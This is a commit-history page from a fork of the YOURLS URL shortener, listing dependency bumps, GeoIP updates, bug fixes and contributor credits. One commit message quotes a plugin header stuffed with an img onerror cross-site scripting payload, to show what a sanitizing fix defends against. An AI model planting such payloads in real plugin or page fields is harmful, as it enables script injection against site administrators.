Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.21.0 to 2.21.1.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.21.0...2.21.1)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update certificates (#3389)

Co-authored-by: ozh <ozh@users.noreply.github.com>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update GeoIP DB (#3397)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3405)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.21.1 to 2.21.2

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.21.1 to 2.21.2.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.21.1...2.21.2)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB (#3417)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3419)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3424)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3432)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* When adding URLs, new HTML rows should have unique HTML IDs. (#3431)

* When adding URLs, new HTML rows should have unique HTML IDs.
* Fix newly added assertions in Format_General::test_string2htmlid()

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Typofixes

* Update admin/index.php

Co-authored-by: dgw <dgw@technobabbl.es>

* Update GeoIP DB (#3436)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB

* Update certificates

* Bump shivammathur/setup-php from 2.21.2 to 2.22.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.21.2 to 2.22.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.21.2...2.22.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB (#3453)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Support PHP 8.2 (#3474)

* Update GeoIP DB

* Update GeoIP DB (#3477)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3479)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.22.0 to 2.23.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.22.0 to 2.23.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.22.0...2.23.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump dependencies

  - Upgrading composer/ca-bundle (1.3.1 => 1.3.4)
  - Upgrading geoip2/geoip2 (v2.12.2 => v2.13.0)
  - Upgrading ozh/bookmarkletgen (1.2 => 1.2.2)
  - Upgrading pomo/pomo (v1.4.1 => v1.5.0)
  - Upgrading rmccue/requests (2.0.2 => v2.0.5)
  - Upgrading spatie/array-to-xml (2.16.0 => 2.17.1)
  - Upgrading symfony/polyfill-intl-idn (v1.25.0 => v1.27.0)
  - Upgrading symfony/polyfill-intl-normalizer (v1.25.0 => v1.27.0)
  - Upgrading symfony/polyfill-mbstring (v1.25.0 => v1.27.0)
  - Upgrading symfony/polyfill-php72 (v1.25.0 => v1.27.0)

* Update certificates

* Update GeoIP DB (#3488)

Co-authored-by: ozh <ozh@users.noreply.github.com>
Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>

* Bump shivammathur/setup-php from 2.23.0 to 2.24.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.23.0 to 2.24.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.23.0...2.24.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP workflow; set-output is deprecated

* Update cert workflow: set-output is deprecated

* Use the correct version 9 of PHPUnit

* Improve Actions name readability

* Update GeoIP DB (#3499)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Support usernames containing brackets (#3365)

* wrapped $user in preg_quote function
* updated auth test for special character in username

Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Use sandbox for all included files (#3478)

- updated calls to functions
- deprecate function yourls_activate_plugin_sandbox()
- add unit tests
- log loaded files
- tweak yourls_debug_log to allow early uses

Co-authored-by: e-ht <1045813+e-ht@users.noreply.github>
Co-authored-by: eht <1045813+e-ht@users.noreply.github.com>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

Closes #3321

* Fix bug where editing a URL will update the first entry in the table (#3485)

Pass id to yourls_table_edit_row() so the correct line in the table is updated.
Fixes #3485

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Remove cookies from $_REQUEST (#3516)

Closes #3383
Closes #3351

* Make Googlebot indexing filterable (#3517)

Closes #3486

* Fix click threshold in admin view (#3518)

Fixes #3460

* Update GeoIP DB (#3519)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3526)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Comment what \"cache\" means here

[skip ci]

* Fixes bookmarklets with URL containing special chars (#3527)

Fixes #3523

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update CHANGELOG

[skip ci]

* Fix typo in comment (#3535)

* Bump version for 1.9.2 (#3537)

* Bump version

[skip ci]

* sync to upstream/master

---------

Signed-off-by: Aaron <admin@datahoarder.dev>
Signed-off-by: dependabot[bot] <support@github.com>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>
Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>
Co-authored-by: Darrell Agee <dagee3@users.noreply.github.com>
Co-authored-by: Marcus <MarcProe@users.noreply.github.com>
Co-authored-by: Liu Yue <hangxingliu@gmail.com>
Co-authored-by: Artur Weigandt <Art4@users.noreply.github.com>
Co-authored-by: Philip Colmer <pcolmer@users.noreply.github.com>
Co-authored-by: Lukas MÃ¼ller <info@muellerlukas.de>
Co-authored-by: Audrey Maniez <amaniez@access42.net>
Co-authored-by: paulgoodchild <paulgoodchild@users.noreply.github.com>
Co-authored-by: Michael Bemmerl <mail@mx-server.de>
Co-authored-by: JÃ©rÃ©my K <JeremyKeusters@users.noreply.github.com>
Co-authored-by: hdkjjsk612 <47492172+hdkjjsk612@users.noreply.github.com>
Co-authored-by: Ingo Kleiber <ikleiber@gmail.com>
Co-authored-by: ueickmann <45387393+ueickmann@users.noreply.github.com>
Co-authored-by: Aaryan Porwal <54525904+aaryanporwal@users.noreply.github.com>
Co-authored-by: Hitesh Jethva <hitjethva@gmail.com>
Co-authored-by: dgw <dgw@technobabbl.es>
Co-authored-by: Florian Latifi <mail@florian-latifi.at>
Co-authored-by: The Zach <zach2825@users.noreply.github.com>
Co-authored-by: Leo Viezens <leo.viezens@web.de>
Co-authored-by: Bibo-Joshi <hinrich.mahler@freenet.de>
Co-authored-by: Dan Benton <dan@dogsbody.com>
Co-authored-by: Aaron <admin@datahoarder.dev>
Co-authored-by: simon-eller <63782380+simon-eller@users.noreply.github.com>
Co-authored-by: LinuxStans <78315004+LinuxStans@users.noreply.github.com>
Co-authored-by: Jay Holtslander <j.holtslander@gmail.com>
Co-authored-by: Karsten Hoffmeyer <mediawiki@kghoffmeyer.de>
Co-authored-by: Jonathan Dahan <55917666+jonathandhn@users.noreply.github.com>
Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
Co-authored-by: Jens Spanier <42373861+Virinum@users.noreply.github.com>
Co-authored-by: David Faber <dcfaber@gmail.com>
Co-authored-by: Peter Gasser <github@boedah.de>
Co-authored-by: Bryan Joshua Pedini <b.pedini@bjphoster.com>
Co-authored-by: Kaito Udagawa <umireon@gmail.com>
Co-authored-by: Dan Raper <djr2468@gmail.com>
Co-authored-by: jaas666 <30204147+jaas666@users.noreply.github.com>
Co-authored-by: github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>
Co-authored-by: yourls-bot[bot] <104057305+yourls-bot[bot]@users.noreply.github.com>
Co-authored-by: ozh <ozh@users.noreply.github.com>
Co-authored-by: Barry Hughes <3594411+barryhughes@users.noreply.github.com>
Co-authored-by: JT Smith <nexxai@gmail.com>
Co-authored-by: SXN31 <43016545+SXN31@users.noreply.github.com>
Co-authored-by: jarebear6expepjozn6rakjq5iczi3irqwphcvbswgkahd6b6twnxxid <1045813+jarebear6expepjozn6rakjq5iczi3irqwphcvb@users.noreply.github.com>
Co-authored-by: 4BRobby <robby@4bytes.de>
Co-authored-by: firfin <marck@wickedfruit.com>
Co-authored-by: Rodney Stromlund <Rodney.Stromlund@wnco.com>")`
â¦

`[801382d](/iWantToKeepAnon/YOURLS/commit/801382d30b0232118703e19316c429ae02d43f81)`

```
* deprecate Twitter :-(

See [YOURLS#2639](https://github.com/YOURLS/YOURLS/issues/2639) and <https://git.io/Jvhw6> for more info

* Remove obsolete setting and link to wiki

[skip ci] [skip travis] [skip scrutinizer]

* Accept timestamped signature with arbitrary hash ([YOURLS#2644](https://github.com/YOURLS/YOURLS/pull/2644))

* Allow arbitrary hashed signatures
* Force timestamps to int
* Improve comment
* Test new feature and add more tests

* Truncate display of long IP

Ozh doing CSS. Yeah right. Fixes [YOURLS#2266](https://github.com/YOURLS/YOURLS/issues/2266)

[skip travis] [skip ci] [skip scrutinizer]

* deprecate twitter (continued)

[skip travis] [skip scrutinizer] [skip ci]

* Update CHANGELOG.md

* Use SVG logo in lieu of the old PNG one ([YOURLS#2649](https://github.com/YOURLS/YOURLS/pull/2649))

Ahah. I love this expression, "in lieu of" :)
Also, remove those social buttons. I think they're useless and ugly.

* Update share links.

Closes [YOURLS#2554](https://github.com/YOURLS/YOURLS/pull/2554). [skip travis] [skip scrutinizer]

* Move /pages into /user ([YOURLS#2648](https://github.com/YOURLS/YOURLS/pull/2648))

Closes [YOURLS#1582](https://github.com/YOURLS/YOURLS/issues/1582)

* Move `pages/` into `user/`
* Update functions to display pages
* Add tests for pages
* Update .gitignore and robots sample file

Co-authored-by:  LÃ©o Colombaro <git@colombaro.fr>

* Update contributors

I sometimes close pull requests yet use parts of the suggested code. In the
end it's a shame that original submitters are not given credit, so this
commit is just a sincere "thank you" to:
- [@dagee3](https://github.com/dagee3) for [YOURLS#2362](https://github.com/YOURLS/YOURLS/pull/2362)
- [@MarcProe](https://github.com/MarcProe) for [YOURLS#2445](https://github.com/YOURLS/YOURLS/pull/2445)
- [@hangxingliu](https://github.com/hangxingliu) for [YOURLS#2545](https://github.com/YOURLS/YOURLS/pull/2545)
- [@Art4](https://github.com/Art4) for [YOURLS#2581](https://github.com/YOURLS/YOURLS/pull/2581)
- [@pcolmer](https://github.com/pcolmer) / [@philip-linaro](https://github.com/philip-linaro) for [YOURLS#2608](https://github.com/YOURLS/YOURLS/pull/2608)
- [@muellerlukas](https://github.com/muellerlukas) for [YOURLS#2554](https://github.com/YOURLS/YOURLS/pull/2554)

Co-authored-by: Darrell Agee <dagee3@users.noreply.github.com>
Co-authored-by: Marcus <MarcProe@users.noreply.github.com>
Co-authored-by: Liu Yue <hangxingliu@gmail.com>
Co-authored-by: Artur Weigandt <Art4@users.noreply.github.com>
Co-authored-by: Philip Colmer <pcolmer@users.noreply.github.com>
Co-authored-by: Lukas MÃ¼ller <info@muellerlukas.de>

(hoping they'll show in the contributors list)

* Update contributors

I sometimes close pull requests yet use parts of the suggested code. In the
end it's a shame that original submitters are not given credit, so this
commit is just a sincere "thank you" to:
- [@dagee3](https://github.com/dagee3) for [YOURLS#2362](https://github.com/YOURLS/YOURLS/pull/2362)
- [@MarcProe](https://github.com/MarcProe) for [YOURLS#2445](https://github.com/YOURLS/YOURLS/pull/2445)
- [@hangxingliu](https://github.com/hangxingliu) for [YOURLS#2545](https://github.com/YOURLS/YOURLS/pull/2545)
- [@Art4](https://github.com/Art4) for [YOURLS#2581](https://github.com/YOURLS/YOURLS/pull/2581)
- [@pcolmer](https://github.com/pcolmer) / [@philip-linaro](https://github.com/philip-linaro) for [YOURLS#2608](https://github.com/YOURLS/YOURLS/pull/2608)
- [@muellerlukas](https://github.com/muellerlukas) for [YOURLS#2554](https://github.com/YOURLS/YOURLS/pull/2554)

(hoping they'll show in the contributors list)
[skip scrutinizer] [skip travis]

Co-authored-by: Darrell Agee <dagee3@users.noreply.github.com>
Co-authored-by: Marcus <MarcProe@users.noreply.github.com>
Co-authored-by: Liu Yue <hangxingliu@gmail.com>
Co-authored-by: Artur Weigandt <Art4@users.noreply.github.com>
Co-authored-by: Philip Colmer <pcolmer@users.noreply.github.com>
Co-authored-by: Lukas MÃ¼ller <info@muellerlukas.de>

* Add labels to every input on index page ([YOURLS#2650](https://github.com/YOURLS/YOURLS/pull/2650))

Props [@audreymaniez](https://github.com/audreymaniez)
Closes [YOURLS#2300](https://github.com/YOURLS/YOURLS/pull/2300)

Co-authored-by: Audrey Maniez <amaniez@access42.net>

* Always return trimmed (and filtered) YOURLS_SITE ([YOURLS#2653](https://github.com/YOURLS/YOURLS/pull/2653))

Closes [YOURLS#2651](https://github.com/YOURLS/YOURLS/issues/2651)

* Reorganize .gitignore for readability

It was either too forgiving or too ignoring
[skip scrutinizer] [skip travis]

* Add missing translations ([YOURLS#2655](https://github.com/YOURLS/YOURLS/pull/2655))

Fixes [YOURLS#1666](https://github.com/YOURLS/YOURLS/issues/1666)
Fixes [YOURLS#1598](https://github.com/YOURLS/YOURLS/issues/1598)
Closes [YOURLS#1655](https://github.com/YOURLS/YOURLS/issues/1655)

* Validate api.yourls.org result when checking for new version ([YOURLS#2657](https://github.com/YOURLS/YOURLS/pull/2657))

* Bump to 1.7.9

* Bump 1.7.10

* Forbid tests/

Fixes [YOURLS#2664](https://github.com/YOURLS/YOURLS/issues/2664)

* Split functions.php in smaller files

New function files for:
* debug
* options
* links
* geo
* shorturls
Fixes [YOURLS#2654](https://github.com/YOURLS/YOURLS/issues/2654)

* Regroup and always load auth functions
Fixes [YOURLS#2662](https://github.com/YOURLS/YOURLS/issues/2662)
Fixes [YOURLS#2661](https://github.com/YOURLS/YOURLS/issues/2661)

Co-authored-by: paulgoodchild <paulgoodchild@users.noreply.github.com>

* Readme tweak ([YOURLS#2671](https://github.com/YOURLS/YOURLS/pull/2671))

* Stop hotlinking images from yourls.org
* Linkable h2 & h3

* Gandi link

[skip travis] [skip scrutinizer]

* Allow 255 chars for the user agent ([YOURLS#2672](https://github.com/YOURLS/YOURLS/pull/2672))

* New/better hooks for referrer and user agent

* Update deps ([YOURLS#2676](https://github.com/YOURLS/YOURLS/pull/2676))

* Begin functions cleaning, starting with GEO. ([YOURLS#2670](https://github.com/YOURLS/YOURLS/pull/2670))

* cleanup geo functions
* add support for CloudFlare's Country GEO header without the need for IP resolution and database
* ensure flag URL always returns a string, instead of false on failure as the result is always used as a string (without validation)
* add helper yours_get_db() so we don't need to use "global $ydb" throughout and it ensures that ydb is always initialised correctly and hasn't ever been changed to something incompatible.
* simplify debug get log
* tidy up code and phpdocs for functions-plugins
* cleanup & phpdocs for parts of functions.php
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Smarter keyword sanitization ([YOURLS#2682](https://github.com/YOURLS/YOURLS/pull/2682))

* Smarter keyword sanitizing, based on context
* Deprecate yourls_sanitize_string()

Fixes [YOURLS#2646](https://github.com/YOURLS/YOURLS/issues/2646).
Fixes [YOURLS#2128](https://github.com/YOURLS/YOURLS/issues/2128).

* Update README.md

* Timezones ([YOURLS#2684](https://github.com/YOURLS/YOURLS/pull/2684))

* Implemented support for timezones
* Removed OFFSET const from config
* Localized yet sortable date in admin shorturl list
* Unit tests
* Code cleanup

Co-authored-by: JÃ©rÃ©my K <JeremyKeusters@users.noreply.github.com>

* More flexible plugin headers, and tests

* Correcting minor typo

* Revise yourls_date_i18n() ([YOURLS#2701](https://github.com/YOURLS/YOURLS/pull/2701))

* Revise yourls_date_i18n()
* Remove useless function
* Save one query on each call ð

Fixes [YOURLS#2694](https://github.com/YOURLS/YOURLS/issues/2694)

* Reverse build script logic ([YOURLS#2705](https://github.com/YOURLS/YOURLS/pull/2705))

By default simply list what would go, but don't delete anything

* PHPUnit tweaks ([YOURLS#2706](https://github.com/YOURLS/YOURLS/pull/2706))

* Overwrite tests/composer.json with specific phpunit version depending on PHP version
* Send code coverage to scrutinize

* Update README

Actual links to contributing.md

* Readme tweaks

* Moar badges. I love badges.

* Clarify allowed chars in table names & prefixes ([YOURLS#2721](https://github.com/YOURLS/YOURLS/pull/2721))

Fixes [YOURLS#2720](https://github.com/YOURLS/YOURLS/issues/2720)

* Fix typos

* Update sample plugin ([YOURLS#2737](https://github.com/YOURLS/YOURLS/pull/2737))

Remove all third party, deprecated or not. Fixes [YOURLS#2736](https://github.com/YOURLS/YOURLS/issues/2736).

* Extend filter-hook "table_add_row_action_array"

Closes [YOURLS#2743](https://github.com/YOURLS/YOURLS/issues/2743)

* The mac client is deprecated ([YOURLS#2754](https://github.com/YOURLS/YOURLS/pull/2754))

The mac client is deprecated and the link is redirecting to other website (<http://timi.im/app/>) which looks malicious.

* Update readme.html ([YOURLS#2758](https://github.com/YOURLS/YOURLS/pull/2758))

Add YOURLS installation link for Ubuntu 20.04 version.

Co-authored-by: dgw <dgw@technobabbl.es>

* Fix that effing encoding problem ([YOURLS#2690](https://github.com/YOURLS/YOURLS/pull/2690))

This commit's changelog

- less encode/decode
- update jQuery & remove old ones
- No encoding in JS
- Also, 4 spaces in JS too, duh
- IDN domain functions
- Use mb_ functions to preverse IDN domains
- Support for UTF8MB4
- update install procedure
- update upgrade procedure. Note: The log table will be left untouched by the upgrade, it's impossible to make a convenient upgrade script for thousands of rows. The only problem will be if someone uses UTF8 short URLs (eg `[http://sho.rt/Ã©Ã©ð©`](http://sho.rt/%C3%A9%C3%A9%F0%9F%92%A9%60))
- Handle normalization of IDN domains & tests
- Fix warning on 7.2 and 7.3
- Deal with encoding in bookmarklets
- Enclose upgrade queries in a transaction
- Force no caching upon install or upgrade. Note: Strange behavior: if YOURLS hosted on an IDN domain, browser (FF at least) caches the redirection from admin/index.php to admin/install.php
- Support for IDN YOURLS hosting
- Tests for IDN YOURLS hosting
- Fix code (that will never get run again)
- Don't cache ajax requests
- Remove unnecessary function call
- Add comment doc block
- More IDN sanitizing tests
- IDN : Screw the "open dots". Who's going to type domainãcom instead of domain.com anyway? Seriously. (although these do pass on my dev box)
- Deprecate yourls_lowercase_scheme_domain()
- Update doc to reflect DB change

* On logout, explicitely send to index.php

Fix logout link in admin panel.

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Sanitize plugin file header before display ([YOURLS#2761](https://github.com/YOURLS/YOURLS/pull/2761))

Avoid improbable case such as:

/**
 * Plugin Name: anything"><img src=x onerror=prompt("name")>
 * Plugin URI: anything"><img src=x onerror=prompt("")>
 * Description: anything"><img src=x onerror=prompt("desc")>
 * Version: anything"><img src=x onerror=prompt('version')>
 * Author: anything"><img src=x onerror=prompt('author')>
 * Author URI: anything"><img src=x onerror=prompt("desc")>
 */

* Remove `global $ydb` calls and prefer helper function ([YOURLS#2762](https://github.com/YOURLS/YOURLS/pull/2762))

Fixes [YOURLS#2698](https://github.com/YOURLS/YOURLS/issues/2698)

Changes :
- Replace all global $ydb; and $ydb->... with yourls_get_db()-> in code and tests
- Add tests
- Introduce yourls_set_db()

* Replace `call_user_func()` with variable functions ([YOURLS#2763](https://github.com/YOURLS/YOURLS/pull/2763))

Fixes [YOURLS#2714](https://github.com/YOURLS/YOURLS/issues/2714)

* Display default shorturls_length in the database if not already set ([YOURLS#2767](https://github.com/YOURLS/YOURLS/pull/2767))

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update XML lib for API output ([YOURLS#2770](https://github.com/YOURLS/YOURLS/pull/2770))

Will close [YOURLS#2668](https://github.com/YOURLS/YOURLS/issues/2668)

* Add verifications for exception messages in tests ([YOURLS#2780](https://github.com/YOURLS/YOURLS/pull/2780))

* Add WhatsApp and Telegram Protocols ([YOURLS#2781](https://github.com/YOURLS/YOURLS/pull/2781))

* Fix typo broken in [YOURLS#2781](https://github.com/YOURLS/YOURLS/pull/2781) ([YOURLS#2786](https://github.com/YOURLS/YOURLS/pull/2786))

* Update clipboard.js to 2.0.6 ([YOURLS#2788](https://github.com/YOURLS/YOURLS/pull/2788))

Internal breaking change : js constructor from `new Clipboard()` to `new ClipboardJS()`

Signed-off-by: Aaron <admin@datahoarder.dev>

* optional `$title` param in `yourls_table_add_row()` can't be optional ([YOURLS#2808](https://github.com/YOURLS/YOURLS/pull/2808))

PHP 8.0 deprecated optional parameters before required ones:
<https://php.watch/versions/8.0/deprecate-required-param-after-optional>

All call sites in YOURLS already pass `$title` (because they have to),
so there's no reason it needs to be an optional argument. This change
resolves part of [YOURLS#2807](https://github.com/YOURLS/YOURLS/issues/2807).

Additionally, the first line of `yourls_table_add_row()` was indented
with spaces instead of using s tab character like the rest of the file.
This has been corrected as a bonus.

* Update tests matrix and setup

* Update travis for composer 2
* Update xdebug.mode in php.ini
* Bump PHPUnit versions for PHP 8 and nightly
* Remove 5.6

* Replace double quotes with single quotes, preventing fatal exception when running on MySQL 8 ([YOURLS#2800](https://github.com/YOURLS/YOURLS/pull/2800))

Fixes [YOURLS#2799](https://github.com/YOURLS/YOURLS/issues/2799)

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update Travis badge

[skip ci] [skip travis]

* Update libs and fix PHP 8 ([YOURLS#2824](https://github.com/YOURLS/YOURLS/pull/2824))

Fixes [YOURLS#2807](https://github.com/YOURLS/YOURLS/issues/2807)

* Update libs
* Refactor the logging system to match Aura SQL 3
* Bump PHPUnit version
* Downgrade spatie/array-to-xml to 2.15
* Upgrade expectations to PHPUnit 8+
* Drop PHPUnit 6 support

Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>

* Move to GitHub Actions ([YOURLS#2828](https://github.com/YOURLS/YOURLS/pull/2828))

* Move to GitHub Actions
* Switch badges to GitHub Actions
* Add dependabot for github-actions actions

* SVG icons ([YOURLS#2822](https://github.com/YOURLS/YOURLS/pull/2822))

Co-authored-by: Ozh <ozh@ozh.org>

* Update readme.html ([YOURLS#2823](https://github.com/YOURLS/YOURLS/pull/2823))

Added a new detailed tutorial for LEMP+Let's Encrypt

* SVG logo and icon as designed by [@JayHoltslander](https://github.com/JayHoltslander) ([YOURLS#2837](https://github.com/YOURLS/YOURLS/pull/2837))

Co-authored-by: Jay Holtslander <j.holtslander@gmail.com>

* Disable 8.1  ([YOURLS#2838](https://github.com/YOURLS/YOURLS/pull/2838))

Disable 8.1 run as allow run failure not available

* Use short array syntax ([YOURLS#2839](https://github.com/YOURLS/YOURLS/pull/2839))

* Revert enclosing in transaction

Fixes [YOURLS#2827](https://github.com/YOURLS/YOURLS/issues/2827)

* Fix collation in the update to current master ([YOURLS#2840](https://github.com/YOURLS/YOURLS/pull/2840))

* Fix collation in the update. Bump DB to 506.
* Fixes [YOURLS#2766](https://github.com/YOURLS/YOURLS/issues/2766)

* Bump min PHP requirement ([YOURLS#2841](https://github.com/YOURLS/YOURLS/pull/2841))

* Readme cleanup ([YOURLS#2842](https://github.com/YOURLS/YOURLS/pull/2842))

Remove all unofficial links, now to be found on <https://github.com/YOURLS/awesome-yourls>

* 1.8, baby

* Update CHANGELOG.md

Adding 1.8 and 1.7.9 that was forgotten

* Add missing escapes characters to MySQL query in functions-upgrade.php ([YOURLS#2844](https://github.com/YOURLS/YOURLS/pull/2844))

* Bump shivammathur/setup-php from 2.9.0 to 2.10.0 ([YOURLS#2847](https://github.com/YOURLS/YOURLS/pull/2847))

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.9.0 to 2.10.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.9.0...fa18c2b](https://github.com/shivammathur/setup-php/compare/2.9.0...fa18c2b29fb5bc1e52e8cf211aad2aaa9b79d232))

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Create labeler.yml

* Create label-commenter-config.yml

* Fix branch name in actions

* Update collation on install ([YOURLS#2846](https://github.com/YOURLS/YOURLS/pull/2846))

* Fix is_private overruling ([YOURLS#2859](https://github.com/YOURLS/YOURLS/pull/2859))

* Fix is_private overruling
* Simplify function yourls_is_private

* Support for 'all' hook ([YOURLS#2860](https://github.com/YOURLS/YOURLS/pull/2860))

* Improve inline doc & comments
* Introduce support for the 'all' hook
* Unit test nitpicking

* 1.8.1 changelog

[skip ci]

* Bump for 1.8.1

[skip ci]

* Fix SVG for IE 11 ([YOURLS#2864](https://github.com/YOURLS/YOURLS/pull/2864))

* Add viewBox attribute to favicon
* Logo missing viewBox as well

* Add a release workflow to dispatch to Docker repo

* Promote GitHub Discussions for community support

* Promote awesome-yourls

* Bump shivammathur/setup-php from 2.10.0 to 2.11.0

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.10.0 to 2.11.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.10.0...b0559f7](https://github.com/shivammathur/setup-php/compare/2.10.0...b0559f7f8eaf458ae85a7bb2f83b25d37211160e))

Signed-off-by: dependabot[bot] <support@github.com>

* Bump rmccue/requests from 1.7.0 to 1.8.0 ([YOURLS#2916](https://github.com/YOURLS/YOURLS/pull/2916))

Bumps [rmccue/requests](<https://github.com/rmccue/Requests>) from 1.7.0 to 1.8.0.
- [Release notes](<https://github.com/rmccue/Requests/releases>)
- [Changelog](<https://github.com/WordPress/Requests/blob/master/CHANGELOG.md>)
- [Commits]([WordPress/Requests@v1.7.0...v1.8.0](https://github.com/WordPress/Requests/compare/v1.7.0...v1.8.0))

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Refactor admin/index.php & more filters ([YOURLS#2912](https://github.com/YOURLS/YOURLS/pull/2912))

* Move some logic from admin/index.php to own class
* Comments & documentation

* Clarify what setting is for

Wiki page added: <https://yourls.org/urlconvert>
For the lolz, here are the values for this setting encountered in the wild: <https://gist.github.com/ozh/46056801ee25b9f328334b3ce0e32f1b>

[skip ci]

* Bump peter-evans/create-pull-request from 3 to 3.9.1

Bumps [peter-evans/create-pull-request](<https://github.com/peter-evans/create-pull-request>) from 3 to 3.9.1.
- [Release notes](<https://github.com/peter-evans/create-pull-request/releases>)
- [Commits]([peter-evans/create-pull-request@v3...v3.9.1](https://github.com/peter-evans/create-pull-request/compare/v3...v3.9.1))

Signed-off-by: dependabot[bot] <support@github.com>

* Bump actions/checkout from 2 to 2.3.4

Bumps [actions/checkout](<https://github.com/actions/checkout>) from 2 to 2.3.4.
- [Release notes](<https://github.com/actions/checkout/releases>)
- [Changelog](<https://github.com/actions/checkout/blob/main/CHANGELOG.md>)
- [Commits]([actions/checkout@v2...v2.3.4](https://github.com/actions/checkout/compare/v2...v2.3.4))

Signed-off-by: dependabot[bot] <support@github.com>

* Bump peaceiris/actions-label-commenter from 1 to 1.9.1

Bumps [peaceiris/actions-label-commenter](<https://github.com/peaceiris/actions-label-commenter>) from 1 to 1.9.1.
- [Release notes](<https://github.com/peaceiris/actions-label-commenter/releases>)
- [Changelog](<https://github.com/peaceiris/actions-label-commenter/blob/main/CHANGELOG.md>)
- [Commits]([peaceiris/actions-label-commenter@v1...v1.9.1](https://github.com/peaceiris/actions-label-commenter/compare/v1...v1.9.1))

Signed-off-by: dependabot[bot] <support@github.com>

* bugfix/db upgrade 506 ([YOURLS#2933](https://github.com/YOURLS/YOURLS/pull/2933))

* fix duplicate array key
* convert url table *after* changing field length to avoid "key was too long; max key length is 767 bytes" error on some DB setups

* Bump peter-evans/create-pull-request from 3.9.1 to 3.9.2 ([YOURLS#2942](https://github.com/YOURLS/YOURLS/pull/2942))

Bumps [peter-evans/create-pull-request](<https://github.com/peter-evans/create-pull-request>) from 3.9.1 to 3.9.2.
- [Release notes](<https://github.com/peter-evans/create-pull-request/releases>)
- [Commits]([peter-evans/create-pull-request@v3.9.1...v3.9.2](https://github.com/peter-evans/create-pull-request/compare/v3.9.1...v3.9.2))

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Bump peter-evans/create-pull-request from 3.9.2 to 3.10.0

Bumps [peter-evans/create-pull-request](<https://github.com/peter-evans/create-pull-request>) from 3.9.2 to 3.10.0.
- [Release notes](<https://github.com/peter-evans/create-pull-request/releases>)
